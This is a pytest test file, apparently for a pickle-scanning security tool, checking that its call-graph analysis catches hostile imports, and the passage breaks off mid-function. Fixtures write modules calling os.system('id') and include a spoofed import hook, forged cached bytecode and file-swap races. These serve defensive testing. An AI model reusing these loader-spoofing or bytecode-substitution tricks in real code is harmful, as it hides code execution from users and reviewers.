    report = PickleReport(
        source="loaded-safe-module.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "loaded_safe_module", "name": "safe"},),
            "callable_invocations": ({"module": "loaded_safe_module", "name": "safe"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert any(notice.code == "call_graph_source_unavailable" for notice in updated.notices)
    source_fingerprints = updated.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert str(module_path.absolute()) not in source_fingerprints["fingerprints"]
    assert source_fingerprints["module_sources"] == {}
    assert source_fingerprints["loaded_module_sources"] == {}


def test_with_call_graph_findings_fingerprints_parent_package_markers(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    first_root = tmp_path / "first"
    second_root = tmp_path / "second"
    first_package = first_root / "fingerprint_pkg"
    second_package = second_root / "fingerprint_pkg"
    first_package.mkdir(parents=True)
    second_package.mkdir(parents=True)
    (first_package / "child.py").write_text("import os\n\ndef entrypoint():\n    return os.system('id')\n")
    (second_package / "__init__.py").write_text("")
    (second_package / "child.py").write_text("def entrypoint():\n    return 1\n")
    monkeypatch.syspath_prepend(str(second_root))
    monkeypatch.syspath_prepend(str(first_root))
    _isolate_reusable_meta_path_finders(monkeypatch)

    report = PickleReport(
        source="parent-package-marker.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "fingerprint_pkg.child", "name": "entrypoint"},),
            "callable_invocations": ({"module": "fingerprint_pkg.child", "name": "entrypoint"},),
        },
    )

    initial = package_api._with_call_graph_findings(report)

    assert initial.verdict == SafetyVerdict.CLEAN
    source_fingerprints = initial.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["fingerprints"][str((first_package / "__init__.py").absolute())] is None

    (first_package / "__init__.py").write_text("")
    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in updated.findings)


def test_with_call_graph_findings_fingerprints_higher_priority_namespace_candidates(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    first_root = tmp_path / "first"
    second_root = tmp_path / "second"
    first_package = first_root / "namespace_pkg"
    second_package = second_root / "namespace_pkg"
    first_package.mkdir(parents=True)
    second_package.mkdir(parents=True)
    safe_module = second_package / "child.py"
    safe_module.write_text("def entrypoint():\n    return 1\n")
    monkeypatch.syspath_prepend(str(second_root))
    monkeypatch.syspath_prepend(str(first_root))
    _isolate_reusable_meta_path_finders(monkeypatch)

    report = PickleReport(
        source="namespace-candidate.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "namespace_pkg.child", "name": "entrypoint"},),
            "callable_invocations": ({"module": "namespace_pkg.child", "name": "entrypoint"},),
        },
    )

    initial = package_api._with_call_graph_findings(report)

    assert initial.verdict == SafetyVerdict.CLEAN
    source_fingerprints = initial.private_metadata["call_graph_source_fingerprints"]
    higher_priority_module = first_package / "child.py"
    assert source_fingerprints["fingerprints"][str(higher_priority_module.absolute())] is None
    assert source_fingerprints["fingerprints"][str(safe_module.absolute())] is not None

    higher_priority_module.write_text("import os\n\ndef entrypoint():\n    return os.system('id')\n")
    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in updated.findings)


def test_with_call_graph_findings_fingerprints_sourceless_parent_package_markers(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    first_root = tmp_path / "first"
    second_root = tmp_path / "second"
    first_package = first_root / "fingerprint_pyc_pkg"
    second_package = second_root / "fingerprint_pyc_pkg"
    first_package.mkdir(parents=True)
    second_package.mkdir(parents=True)
    (first_package / "child.py").write_text("import os\n\ndef entrypoint():\n    return os.system('id')\n")
    (second_package / "child.py").write_text("def entrypoint():\n    return 1\n")
    package_source = tmp_path / "package_init.py"
    package_source.write_text("")
    package_marker = second_package / "__init__.pyc"
    py_compile.compile(str(package_source), cfile=str(package_marker), doraise=True)
    monkeypatch.syspath_prepend(str(second_root))
    monkeypatch.syspath_prepend(str(first_root))
    _isolate_reusable_meta_path_finders(monkeypatch)

    report = PickleReport(
        source="sourceless-parent-package-marker.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "fingerprint_pyc_pkg.child", "name": "entrypoint"},),
            "callable_invocations": ({"module": "fingerprint_pyc_pkg.child", "name": "entrypoint"},),
        },
    )

    initial = package_api._with_call_graph_findings(report)

    assert initial.verdict == SafetyVerdict.CLEAN
    source_fingerprints = initial.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["fingerprints"][str(package_marker.absolute())] is not None

    package_marker.unlink()
    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in updated.findings)


def test_with_call_graph_findings_disables_reuse_for_oversized_module_names() -> None:
    module_name = "m" * 4097
    report = PickleReport(
        source="oversized-module-name.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": module_name, "name": "entrypoint"},),
            "callable_invocations": ({"module": module_name, "name": "entrypoint"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert isinstance(updated.private_metadata["call_graph_source_fingerprints"]["reusable"], bool)


def test_distribution_root_trust_disables_cache_reuse(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = f"modelaudit_editable_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._installed_distribution_roots",
        lambda _top_level_name: (tmp_path.resolve(),),
    )
    _trusted_module_origin_kind.cache_clear()

    try:
        with shared_source_sensitive_caches():
            assert _trusted_module_origin_kind(module_name) == "site_packages"
            metadata = shared_source_fingerprint_metadata()
    finally:
        _trusted_module_origin_kind.cache_clear()

    assert metadata is not None
    assert metadata["reusable"] is False


def test_source_fingerprint_limit_disables_reuse_without_invalidating_report(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_path = tmp_path / "bounded_module.py"
    source_path.write_text("def entrypoint():\n    return 1\n", encoding="utf-8")
    absolute_source_path = str(source_path.absolute())
    monkeypatch.setattr("modelaudit_picklescan.call_graph._MAX_SOURCE_FINGERPRINT_CANDIDATES", 0)
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._current_module_source_path",
        lambda _module_name: absolute_source_path,
    )

    with shared_source_sensitive_caches():
        report_generation = _begin_shared_source_report()
        _track_shared_source_path("bounded_module", source_path, loaded=False)
        _ensure_shared_source_snapshot_stable(report_generation)
        metadata = shared_source_fingerprint_metadata()

    assert metadata is not None
    assert metadata["reusable"] is False


def test_zipimport_archive_changes_invalidate_source_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    archive_path = tmp_path / "modules.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("zip_pkg/__init__.py", "")
        archive.writestr("zip_pkg/helper.py", "def entrypoint():\n    return 1\n")
    monkeypatch.syspath_prepend(str(archive_path))
    _isolate_reusable_meta_path_finders(monkeypatch)

    with shared_source_sensitive_caches():
        report_generation = _begin_shared_source_report()
        _track_shared_source_candidates(("zip_pkg", "helper"))
        metadata = shared_source_fingerprint_metadata()
        assert metadata is not None
        assert metadata["fingerprints"][str(archive_path.absolute())] is not None

        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("zip_pkg/__init__.py", "")
            archive.writestr("zip_pkg/helper.py", "import os\nos.system('id')\n")

        with pytest.raises(_CallGraphAnalysisLimitError, match="source changed"):
            _ensure_shared_source_snapshot_stable(report_generation)


def test_recreated_file_finder_hooks_are_not_trusted() -> None:
    equivalent_hook = FileFinder.path_hook((SourceFileLoader, SOURCE_SUFFIXES))
    different_hook = FileFinder.path_hook((SourcelessFileLoader, BYTECODE_SUFFIXES))

    assert not _is_standard_path_hook(equivalent_hook)
    assert not _is_standard_path_hook(different_hook)


def test_spoofed_equivalent_file_finder_hook_is_not_trusted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = "modelaudit_spoofed_file_finder_hook"
    module_path = tmp_path / f"{module_name}.py"
    module_path.write_text("def entrypoint():\n    return 1\n", encoding="utf-8")
    marker = tmp_path / "evil_loader_called"

    class EvilLoader(SourceFileLoader):
        def get_code(self, fullname: str) -> CodeType:
            del fullname
            return compile(
                "from pathlib import Path\n"
                f"Path({str(marker)!r}).write_text('loaded', encoding='utf-8')\n"
                "def entrypoint():\n"
                "    import os\n"
                "    return os.system('echo hidden')\n",
                str(module_path),
                "exec",
            )

    EvilLoader.__module__ = SourceFileLoader.__module__
    EvilLoader.__qualname__ = SourceFileLoader.__qualname__
    trusted_hook = FileFinder.path_hook((SourceFileLoader, SOURCE_SUFFIXES))
    evil_hook = FileFinder.path_hook((EvilLoader, SOURCE_SUFFIXES))
    evil_hook.__module__ = trusted_hook.__module__
    evil_hook.__qualname__ = trusted_hook.__qualname__
    monkeypatch.setattr(sys, "path_hooks", [evil_hook])
    monkeypatch.syspath_prepend(str(tmp_path))
    sys.path_importer_cache.pop(str(tmp_path), None)

    try:
        assert not _is_standard_path_hook(evil_hook)
        report = scan_bytes(
            b"\x80\x04" + _global(module_name.encode(), b"entrypoint") + b")R.",
            source="spoofed-file-finder-hook.pkl",
        )
        assert report.status == ScanStatus.INCONCLUSIVE
        assert report.verdict == SafetyVerdict.SUSPICIOUS
        assert any(finding.rule_code == "NON_ALLOWLISTED_GLOBAL" for finding in report.findings)
        assert not marker.exists()

        __import__(module_name)
        assert marker.read_text(encoding="utf-8") == "loaded"
    finally:
        sys.modules.pop(module_name, None)
        sys.path_importer_cache.pop(str(tmp_path), None)


def test_pytest_finder_identity_hashes_state_beyond_legacy_item_limit() -> None:
    rewrite_module = pytest.importorskip("_pytest.assertion.rewrite")
    finder_type = rewrite_module.AssertionRewritingHook
    finder = object.__new__(finder_type)
    finder._basenames_to_check_rewrite = set()
    finder.session = None
    finder.fnpats = ()
    finder._writing_pyc = False
    finder._must_rewrite = {*(f"module_{index:02d}" for index in range(16)), "zz_first"}

    initial_identity = _meta_path_finder_resolution_identity(finder)
    finder._must_rewrite.remove("zz_first")
    finder._must_rewrite.add("zz_second")

    assert _meta_path_finder_resolution_identity(finder) != initial_identity


def test_loaded_parent_package_path_controls_child_source_resolution(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    safe_root = tmp_path / "safe"
    runtime_root = tmp_path / "runtime"
    safe_package = safe_root / "loaded_parent_pkg"
    runtime_package = runtime_root / "loaded_parent_pkg"
    safe_package.mkdir(parents=True)
    runtime_package.mkdir(parents=True)
    (safe_package / "__init__.py").write_text("")
    (safe_package / "child.py").write_text("def entrypoint():\n    return 1\n")
    (runtime_package / "__init__.py").write_text("")
    (runtime_package / "child.py").write_text("import os\n\ndef entrypoint():\n    return os.system('id')\n")
    monkeypatch.syspath_prepend(str(safe_root))
    _isolate_reusable_meta_path_finders(monkeypatch)

    loaded_package = ModuleType("loaded_parent_pkg")
    loaded_spec = ModuleSpec(
        "loaded_parent_pkg",
        loader=None,
        origin=str(runtime_package / "__init__.py"),
        is_package=True,
    )
    loaded_spec.submodule_search_locations = [str(runtime_package)]
    loaded_package.__spec__ = loaded_spec
    loaded_package.__path__ = [str(runtime_package)]
    monkeypatch.setitem(sys.modules, "loaded_parent_pkg", loaded_package)

    report = PickleReport(
        source="loaded-parent-package.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": "loaded_parent_pkg.child", "name": "entrypoint"},),
            "callable_invocations": ({"module": "loaded_parent_pkg.child", "name": "entrypoint"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.COMPLETE
    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH" for finding in updated.findings)
    source_fingerprints = updated.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert source_fingerprints["loaded_package_paths"]["loaded_parent_pkg"] == (str(runtime_package.absolute()),)


def test_loaded_parent_package_custom_importer_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    package_name = f"loaded_custom_pkg_{uuid.uuid4().hex}"
    runtime_package = tmp_path / package_name
    runtime_package.mkdir()
    (runtime_package / "child.py").write_text("def entrypoint():\n    return 1\n", encoding="utf-8")

    class CustomFinder:
        def __init__(self) -> None:
            self.calls = 0

        def find_spec(self, fullname: str, _target: object = None) -> ModuleSpec | None:
            self.calls += 1
            return ModuleSpec(fullname, loader=None, origin="custom://child")

    finder = CustomFinder()
    loaded_package = ModuleType(package_name)
    loaded_spec = ModuleSpec(
        package_name,
        loader=None,
        origin=str(runtime_package / "__init__.py"),
        is_package=True,
    )
    loaded_spec.submodule_search_locations = [str(runtime_package)]
    loaded_package.__spec__ = loaded_spec
    loaded_package.__path__ = [str(runtime_package)]
    monkeypatch.setitem(sys.modules, package_name, loaded_package)
    monkeypatch.setitem(sys.path_importer_cache, str(runtime_package), finder)
    report = PickleReport(
        source="loaded-custom-package.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": f"{package_name}.child", "name": "entrypoint"},),
            "callable_invocations": ({"module": f"{package_name}.child", "name": "entrypoint"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert any(notice.code == "call_graph_source_unavailable" for notice in updated.notices)
    assert updated.private_metadata["call_graph_source_fingerprints"]["reusable"] is False
    assert finder.calls == 0


def test_valid_mismatched_source_bytecode_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = "mismatched_cached_bytecode"
    module_path = tmp_path / f"{module_name}.py"
    module_path.write_text("def entrypoint():\n    return 1\n")
    py_compile.compile(str(module_path), doraise=True)
    bytecode_path = Path(cache_from_source(str(module_path)))
    bytecode_header = bytecode_path.read_bytes()[:16]
    marker = tmp_path / "mismatched_bytecode_loaded"
    malicious_code = compile(
        "from pathlib import Path\n"
        f"Path({str(marker)!r}).write_text('loaded', encoding='utf-8')\n"
        "import os\n\ndef entrypoint():\n    return os.system('id')\n",
        str(module_path),
        "exec",
    )
    bytecode_path.write_bytes(bytecode_header + marshal.dumps(malicious_code))
    monkeypatch.syspath_prepend(str(tmp_path))

    report = PickleReport(
        source="mismatched-cached-bytecode.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": module_name, "name": "entrypoint"},),
            "callable_invocations": ({"module": module_name, "name": "entrypoint"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert updated.private_metadata["call_graph_source_fingerprints"]["reusable"] is False
    assert not marker.exists()

    try:
        __import__(module_name)
        assert marker.read_text(encoding="utf-8") == "loaded"
    finally:
        sys.modules.pop(module_name, None)


def test_matching_source_bytecode_remains_analyzable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module_name = "matching_cached_bytecode"
    module_path = tmp_path / f"{module_name}.py"
    module_path.write_text("def entrypoint():\n    return 1\n")
    py_compile.compile(str(module_path), doraise=True)
    monkeypatch.syspath_prepend(str(tmp_path))
    _isolate_reusable_meta_path_finders(monkeypatch)

    report = PickleReport(
        source="matching-cached-bytecode.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": ({"module": module_name, "name": "entrypoint"},),
            "callable_invocations": ({"module": module_name, "name": "entrypoint"},),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.COMPLETE
    assert updated.verdict == SafetyVerdict.CLEAN
    assert updated.findings == ()
    source_fingerprints = updated.private_metadata["call_graph_source_fingerprints"]
    assert source_fingerprints["reusable"] is True
    assert str(Path(cache_from_source(str(module_path))).absolute()) in source_fingerprints["fingerprints"]


@pytest.mark.parametrize("oversized_file", ["source", "bytecode"])
def test_effective_bytecode_validation_rejects_oversized_files_without_unbounded_reads(
    oversized_file: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_path = tmp_path / "bounded_source.py"
    source_path.write_bytes(b"value = 1\n")
    bytecode_path = tmp_path / "bounded_source.pyc"
    bytecode_path.write_bytes(b"invalid-bytecode")
    monkeypatch.setattr("modelaudit_picklescan.call_graph._MAX_SOURCE_BYTES", 32)
    monkeypatch.setattr("modelaudit_picklescan.call_graph._source_cache_path", lambda _path: bytecode_path)

    if oversized_file == "source":
        source_path.write_bytes(b"x" * 33)
    else:
        bytecode_path.write_bytes(b"x" * 65)

    def fail_unbounded_read(_path: Path) -> bytes:
        raise AssertionError("bytecode validation attempted Path.read_bytes()")

    monkeypatch.setattr(Path, "read_bytes", fail_unbounded_read)

    assert not _effective_bytecode_matches_source(source_path)


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="FIFO files are not supported on this platform")
def test_resolution_candidate_fingerprint_rejects_fifo(tmp_path: Path) -> None:
    source_path = tmp_path / "blocked_source.py"
    os.mkfifo(source_path)

    reusable, fingerprint = _resolution_candidate_fingerprint(source_path)

    assert reusable is False
    assert fingerprint is None


def test_resolution_candidate_fingerprint_tracks_large_extension_identity(tmp_path: Path) -> None:
    extension_path = tmp_path / f"native_module{EXTENSION_SUFFIXES[0]}"
    extension_path.write_bytes(b"x" * (1024 * 1024 + 1))

    reusable, initial_fingerprint = _resolution_candidate_fingerprint(extension_path)

    assert reusable is True
    assert isinstance(initial_fingerprint, str)
    assert initial_fingerprint.startswith(f"{_CALL_GRAPH_REGULAR_FILE_FINGERPRINT}:")

    replacement_path = tmp_path / f"replacement{EXTENSION_SUFFIXES[0]}"
    replacement_path.write_bytes(b"y" * (1024 * 1024 + 1))
    os.replace(replacement_path, extension_path)

    reusable, replacement_fingerprint = _resolution_candidate_fingerprint(extension_path)

    assert reusable is True
    assert replacement_fingerprint != initial_fingerprint


@pytest.mark.skipif(sys.platform == "win32", reason="Windows prevents replacing an open source file")
def test_resolution_candidate_fingerprint_rejects_path_replacement_during_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_path = tmp_path / "helper.py"
    source_path.write_bytes(b"def entrypoint():\n    return 1\n")
    replacement_path = tmp_path / "replacement.py"
    malicious_source = b"import os\nos.system('id')\n"
    replacement_path.write_bytes(malicious_source)
    displaced_path = tmp_path / "displaced.py"
    original_read = os.read
    replaced = False

    def replace_after_first_read(file_descriptor: int, size: int) -> bytes:
        nonlocal replaced
        chunk = original_read(file_descriptor, size)
        if chunk and not replaced:
            replaced = True
            source_path.rename(displaced_path)
            replacement_path.rename(source_path)
        return chunk

    monkeypatch.setattr(os, "read", replace_after_first_read)

    assert _resolution_candidate_fingerprint(source_path) == (False, None)
    assert source_path.read_bytes() == malicious_source


@pytest.mark.skipif(sys.platform == "win32", reason="Windows prevents replacing an open source file")
def test_read_candidate_fingerprint_rejects_path_replacement_during_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source_path = tmp_path / "helper.pyc"
    source_path.write_bytes(b"safe bytecode")
    replacement_path = tmp_path / "replacement.pyc"
    malicious_source = b"malicious bytecode"
    replacement_path.write_bytes(malicious_source)
    displaced_path = tmp_path / "displaced.pyc"
    original_read = os.read
    replaced = False

    def replace_after_first_read(file_descriptor: int, size: int) -> bytes:
        nonlocal replaced
        chunk = original_read(file_descriptor, size)
        if chunk and not replaced:
            replaced = True
            source_path.rename(displaced_path)
            replacement_path.rename(source_path)
        return chunk

    monkeypatch.setattr(os, "read", replace_after_first_read)

    assert _read_candidate_fingerprint(source_path) == (False, None)
    assert source_path.read_bytes() == malicious_source


@pytest.mark.skipif(sys.platform == "win32", reason="Windows prevents replacing an open source file")
def test_resolution_extension_fingerprint_rejects_path_replacement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    extension_path = tmp_path / f"native_module{EXTENSION_SUFFIXES[0]}"
    extension_path.write_bytes(b"safe extension")
    replacement_path = tmp_path / f"replacement{EXTENSION_SUFFIXES[0]}"
    replacement_path.write_bytes(b"malicious extension")
    displaced_path = tmp_path / f"displaced{EXTENSION_SUFFIXES[0]}"
    original_fstat = os.fstat
    fstat_calls = 0

    def replace_after_second_fstat(file_descriptor: int) -> os.stat_result:
        nonlocal fstat_calls
        file_stat = original_fstat(file_descriptor)
        fstat_calls += 1
        if fstat_calls == 2:
            extension_path.rename(displaced_path)
            replacement_path.rename(extension_path)
        return file_stat

    monkeypatch.setattr(os, "fstat", replace_after_second_fstat)

    assert _resolution_candidate_fingerprint(extension_path) == (False, None)


def test_standard_file_finder_path_hook_stops_being_trusted_after_method_change(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    standard_hook = next(
        hook
        for hook in sys.path_hooks
        if _path_hook_resolution_identity(hook) == "trusted:importlib.machinery.FileFinder.path_hook"
    )
    initial_identity = _path_hook_resolution_identity(standard_hook)

    def changed_find_spec(self: FileFinder, _name: str, _target: object = None) -> None:
        return None

    monkeypatch.setattr(FileFinder, "find_spec", changed_find_spec)

    changed_identity = _path_hook_resolution_identity(standard_hook)
    assert changed_identity != initial_identity
    assert ":unreusable:" in changed_identity
    assert not _is_standard_path_hook(standard_hook)


def test_arbitrary_path_hook_is_not_trusted_even_if_present_at_startup() -> None:
    class StartupPathHook:
        def __call__(self, _path: str) -> None:
            raise ImportError

    hook = StartupPathHook()

    assert not _is_standard_path_hook(hook)
    assert ":unreusable:" in _path_hook_resolution_identity(hook)


def test_with_call_graph_findings_ignores_uninvoked_click_startup_hook_paths() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-import-only.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            )
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.CLEAN
    assert updated.findings == ()
    assert "call_graph_source_fingerprints" not in updated.metadata
    assert updated.private_metadata["call_graph_source_fingerprints"]["reusable"] is False


def test_scan_bytes_skips_call_graph_enrichment_without_references(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_enrichment(_report: PickleReport) -> PickleReport:
        raise AssertionError("reference-free reports should not enter call-graph enrichment")

    monkeypatch.setattr(package_api, "_with_call_graph_findings", unexpected_enrichment)

    report = scan_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4), source="no-references.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert report.private_metadata["call_graph_source_fingerprints"] == {
        "reusable": True,
        "source_independent": True,
        "fingerprints": {},
        "read_fingerprints": {},
        "module_sources": {},
        "loaded_module_sources": {},
        "loaded_package_paths": {},
    }


def test_scan_bytes_skips_call_graph_enrichment_for_already_critical_references(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def unexpected_enrichment(_report: PickleReport) -> PickleReport:
        raise AssertionError("critical references should not enter redundant call-graph enrichment")

    monkeypatch.setattr(package_api, "_with_call_graph_findings", unexpected_enrichment)

    report = scan_bytes(pickle.dumps(MaliciousPayload(), protocol=4), source="already-critical.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL" and finding.details.get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_call_graph_enrichment_remains_required_for_unreviewed_sibling() -> None:
    report = PickleReport(
        source="critical-with-unreviewed-sibling.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.MALICIOUS,
        findings=(
            Finding(
                message="native critical finding",
                severity=Severity.CRITICAL,
                location="critical-with-unreviewed-sibling.pkl",
                rule_code="DANGEROUS_CALL",
                details={"module": "posix", "name": "system"},
            ),
        ),
        metadata={
            "import_references": (
                {"module": "posix", "name": "system"},
                {"module": "private_payload", "name": "Gadget"},
            )
        },
    )

    assert package_api._call_graph_enrichment_is_redundant(report) is False


def test_scan_bytes_marks_call_graph_enrichment_failures_incomplete(monkeypatch: pytest.MonkeyPatch) -> None:
    def raise_call_graph_error(*_args: object, **_kwargs: object) -> tuple[()]:
        raise RuntimeError("call graph exploded")

    monkeypatch.setattr(package_api, "find_dangerous_call_graphs", raise_call_graph_error)

    report = scan_bytes(b"crandom\n_os.system\n.", source="call-graph-enrichment-error.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert report.metadata["analysis_incomplete"] is True
    assert any(
        error.message == "Python call-graph analysis could not complete: call graph exploded"
        and error.category == "call_graph_analysis_error"
        and error.exception_type == "RuntimeError"
        and error.details["analysis"] == "python_call_graph"
        and error.details["analysis_incomplete"] is True
        for error in report.errors
    )


def test_with_call_graph_findings_preserves_critical_findings_before_limit_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    partial_finding = CallGraphFinding(
        module="click",
        name="edit",
        import_reference="click.edit",
        sink="os.system",
        call_path=("click.edit", "os.system"),
    )

    def raise_call_graph_limit(*_args: object, **_kwargs: object) -> tuple[CallGraphFinding, ...]:
        raise _CallGraphAnalysisLimitError(
            "assignment alias analysis entered a propagation cycle",
            partial_findings=(partial_finding,),
        )

    monkeypatch.setattr(package_api, "find_dangerous_call_graphs", raise_call_graph_limit)
    report = PickleReport(
        source="partial-call-graph-findings.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={"import_references": ()},
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert updated.metadata["analysis_incomplete"] is True
    call_graph_findings = [finding for finding in updated.findings if finding.rule_code == "DANGEROUS_CALL_GRAPH"]
    assert len(call_graph_findings) == 1
    assert call_graph_findings[0].details["module"] == "click"
    assert call_graph_findings[0].details["name"] == "edit"
    assert any(
        error.category == "call_graph_analysis_error"
        and error.exception_type == "_CallGraphAnalysisLimitError"
        and error.details["analysis_incomplete"] is True
        for error in updated.errors
    )


def test_with_call_graph_findings_marks_startup_hook_enrichment_failures_incomplete(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def raise_startup_hook_error(*_args: object, **_kwargs: object) -> tuple[()]:
        raise RuntimeError("startup graph exploded")

    monkeypatch.setattr(package_api, "find_startup_hook_write_call_graphs", raise_startup_hook_error)
    report = PickleReport(
        source="startup-hook-enrichment-error.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            )
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert updated.findings == ()
    assert updated.metadata["analysis_incomplete"] is True
    assert any(
        error.message == "Python call-graph analysis could not complete: startup graph exploded"
        and error.category == "call_graph_analysis_error"
        and error.exception_type == "RuntimeError"
        and error.details["analysis"] == "python_call_graph_startup_hook_write"
        and error.details["analysis_incomplete"] is True
        for error in updated.errors
    )


def test_with_call_graph_findings_preserves_suspicious_verdict_on_enrichment_failure(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def raise_call_graph_error(*_args: object, **_kwargs: object) -> tuple[()]:
        raise RuntimeError("call graph exploded")

    monkeypatch.setattr(package_api, "find_dangerous_call_graphs", raise_call_graph_error)
    finding = Finding(
        message="existing suspicious evidence",
        severity=Severity.WARNING,
        location="suspicious-enrichment-error.pkl",
        rule_code="NON_ALLOWLISTED_GLOBAL",
    )
    report = PickleReport(
        source="suspicious-enrichment-error.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.SUSPICIOUS,
        findings=(finding,),
        metadata={"import_references": ()},
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.SUSPICIOUS
    assert updated.findings == (finding,)
    assert updated.metadata["analysis_incomplete"] is True


def test_unanalyzed_call_graph_notice_preserves_suspicious_verdict() -> None:
    finding = Finding(
        message="existing suspicious evidence",
        severity=Severity.WARNING,
        location="suspicious-source-unavailable.pkl",
        rule_code="NON_ALLOWLISTED_GLOBAL",
    )
    report = PickleReport(
        source="suspicious-source-unavailable.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.SUSPICIOUS,
        findings=(finding,),
    )

    updated = package_api._with_unanalyzed_call_graph_notices(
        report,
        (
            UnanalyzedCallGraphReference(
                module="private_payload",
